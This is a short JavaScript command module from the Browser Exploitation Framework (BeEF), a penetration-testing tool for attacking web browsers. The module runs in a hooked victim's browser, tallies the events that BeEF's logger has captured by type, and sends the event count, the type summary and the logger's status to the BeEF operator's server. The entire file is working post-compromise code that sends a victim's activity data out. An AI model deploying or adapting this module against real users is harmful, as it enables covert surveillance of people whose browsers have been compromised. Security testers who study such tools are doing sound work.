//
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var events = beef.logger.events || [];
	var counts = {};

	for (var i = 0; i < events.length; i++) {
		var type = events[i].type || 'unknown';
		counts[type] = (counts[type] || 0) + 1;
	}

	var summary = [];
	for (var type in counts) {
		summary.push(type + ':' + counts[type]);
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>,
		"event_count=" + events.length +
		"&event_types=" + encodeURIComponent(summary.join(',')) +
		"&logger_running=" + beef.logger.running);

});
